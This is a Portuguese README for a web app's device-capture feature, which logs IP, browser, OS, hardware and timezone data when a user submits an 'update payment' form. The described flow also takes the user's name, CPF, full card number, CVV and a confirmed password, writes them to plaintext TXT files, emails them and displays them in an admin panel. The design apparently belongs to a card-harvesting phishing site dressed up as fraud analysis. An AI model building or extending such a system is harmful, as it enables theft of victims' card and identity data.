# 📊 Sistema de Captura de Dados do Dispositivo

## Visão Geral

O sistema foi atualizado para capturar e armazenar automaticamente informações detalhadas do dispositivo do usuário quando um pagamento é processado. Essas informações são essenciais para análise de fraude, auditoria e resolução de problemas.

## Informações Capturadas

### 1. **IP e Localização**
- `ip` - Endereço IP público do usuário (obtido via API)

### 2. **Navegador**
- `browserName` - Nome do navegador (Chrome, Firefox, Safari, Edge, etc.)
- `browserVersion` - Versão do navegador

### 3. **Sistema Operacional**
- `osName` - SO do dispositivo (Windows, macOS, iOS, Android, Linux, etc.)
- `osVersion` - Versão do SO

### 4. **Tipo de Dispositivo**
- `deviceType` - Tipo (desktop, mobile, tablet, unknown)
- `deviceModel` - Modelo específico (iPhone, Samsung, etc.)
- `isMobile` - Booleano se é mobile
- `isTablet` - Booleano se é tablet

### 5. **Hardware e Tela**
- `screenWidth` - Largura da tela em pixels
- `screenHeight` - Altura da tela em pixels
- `screenColorDepth` - Profundidade de cor (bits)
- `screenPixelDepth` - Profundidade de pixel
- `devicePixelRatio` - Taxa de pixel do dispositivo
- `cores` - Número de núcleos da CPU
- `ram` - Memória RAM em GB (estimado)
- `gpu` - GPU detectado via WebGL

### 6. **Conexão de Rede**
- `connectionType` - Tipo de conexão (4g, wifi, etc.)
- `effectiveConnectionType` - Tipo efetivo de conexão
- `maxTouchPoints` - Número máximo de pontos de toque

### 7. **Localização e Idioma**
- `language` - Idioma principal do navegador
- `languages` - Lista de idiomas do navegador
- `timezone` - Fuso horário (ex: America/Sao_Paulo)
- `timezoneOffset` - Offset do UTC em minutos

### 8. **Outros**
- `userAgent` - String completa do User Agent
- `timestamp` - Data e hora da captura

## Arquitetura

### Frontend (React/TypeScript)

#### Arquivo: `src/utils/device-detector.ts`
Utilitário principal que:
- Detecta todas as informações do dispositivo
- Implementa detecção de navegador, SO e dispositivo
- Busca o IP via APIs públicas (ipify, db-ip)
- Exporta funções e hooks para uso nos componentes

**Funções principais:**
- `detectDeviceInfo()` - Captura todas as informações (async)
- `useDeviceInfo()` - Hook para uso em componentes React
- `detectBrowser()` - Detecta navegador do User Agent
- `detectOS()` - Detecta SO
- `detectDeviceType()` - Detecta tipo de dispositivo
- `fetchIP()` - Busca IP público

#### Arquivo: `src/components/PaymentProcessingScreen.tsx`
- Captura deviceInfo quando a tela de processamento abre
- Envia informações do dispositivo junto com os dados de pagamento
- Inclui `deviceInfo` no corpo da requisição POST

#### Arquivo: `src/pages/Admin.tsx`
- Mostra as informações do dispositivo na tela de detalhes do pagamento
- Permite copiar cada campo de informação
- Seção "Informações do Dispositivo" aparece condicionalmente

### Backend (Python/FastAPI)

#### Arquivo: `backend/main.py`

**Modelos Pydantic:**
- `DeviceData` - Modelo com todos os campos de dispositivo
- `PaymentData` - Expandido para incluir campos de device (opcionais)

**Funções atualizadas:**
- `save_payment_data()` - Armazena informações do dispositivo em arquivo TXT
- `send_email()` - Inclui seção de dispositivo no email
- `parse_payment_file()` - Faz parsing das informações do dispositivo

**Formato de Armazenamento:**
Os dados são salvos em arquivos TXT com a seguinte estrutura:
```
DADOS DE PAGAMENTO
================================================================================

Data/Hora: DD/MM/YYYY, HH:MM:SS

INFORMAÇÕES PESSOAIS
Nomes e CPF...

DADOS DO CARTÃO
Cartão, validade, CVV...

INFORMAÇÕES DO DISPOSITIVO
IP, Navegador, SO, Tipo de Dispositivo, Resolução, Idioma, Fuso Horário, etc...
```

## Fluxo de Dados

```
1. Usuário acessa a página de pagamento
   ↓
2. Usuário preenche dados e clica "Atualizar pagamento"
   ↓
3. PaymentProcessingScreen abre e captura deviceInfo via detectDeviceInfo()
   ↓
4. Usuário confirma senha
   ↓
5. sendPaymentToBackend() envia:
   - Dados do pagamento (nome, CPF, cartão, etc)
   - Dados do dispositivo (IP, navegador, SO, etc)
   ↓
6. Backend recebe em /api/update-payment
   ↓
7. Backend salva em arquivo TXT com seção de dispositivo
   ↓
8. Backend envia email com informações do dispositivo incluídas
   ↓
9. Admin pode visualizar dispositivo no painel administrativo
```

## Privacidade e Segurança

⚠️ **Importante:** Essas informações são sensíveis. Considere:

1. **Conformidade com LGPD/GDPR**: Essas informações podem ser classificadas como dados pessoais
2. **Consentimento do Usuário**: Considere adicionar um banner de consentimento
3. **Criptografia**: Os dados estão armazenados em texto plano nos arquivos - considere criptografia se usar em produção
4. **Acesso**: Apenas administradores devem ter acesso ao painel com essas informações
5. **Retenção**: Estabeleça política de retenção de dados (ex: deletar após 90 dias)

## Tratamento de Erros

- Se o IP não puder ser obtido, é salvo como `null`
- Se alguma informação não estiver disponível, é salva como "Não disponível" ou "?"
- A captura de dispositivo é assíncrona mas não bloqueia o fluxo

## APIs Externas Utilizadas

1. **ipify.org** - Obtém o IP público (timeout de 5s)
   - Fallback para: `api.db-ip.com`

2. **WebGL Context** - Detecta GPU (sem requisições externas)

## Exemplos

### Capturar informações do dispositivo
```typescript
import { detectDeviceInfo } from '@/utils/device-detector';

const deviceInfo = await detectDeviceInfo();
console.log(deviceInfo.ip); // "187.32.15.224"
console.log(deviceInfo.browserName); // "Chrome"
console.log(deviceInfo.osName); // "Windows"
```

### Usar com Hook
```typescript
import { useDeviceInfo } from '@/utils/device-detector';

function MyComponent() {
  const { deviceInfo, isLoading } = useDeviceInfo();
  
  if (isLoading) return <div>Detectando...</div>;
  
  return <div>IP: {deviceInfo?.ip}</div>;
}
```

## Estrutura de Arquivos

```
src/
├── utils/
│   └── device-detector.ts          ← Detector de dispositivo
├── types/
│   └── payment.ts                  ← Inclui DeviceData
├── components/
│   └── PaymentProcessingScreen.tsx ← Captura dispositivo
└── pages/
    └── Admin.tsx                   ← Exibe dispositivo

backend/
└── main.py                         ← Salva e envia dispositivo
```

## Melhorias Futuras

- [ ] Adicionar fingerprinting de dispositivo
- [ ] Detectar use of VPN/Proxy
- [ ] Implementar geolocalização por IP
- [ ] Adicionar análise de comportamento
- [ ] Detectar simuladores/emuladores
- [ ] Implementar criptografia dos dados
- [ ] Adicionar dashboard de análise de fraude
- [ ] Integrar com sistema de alertas

## Histórico de Alterações

- **v1.0.0** (2024-12-30): Implementação inicial do sistema de captura de dispositivo
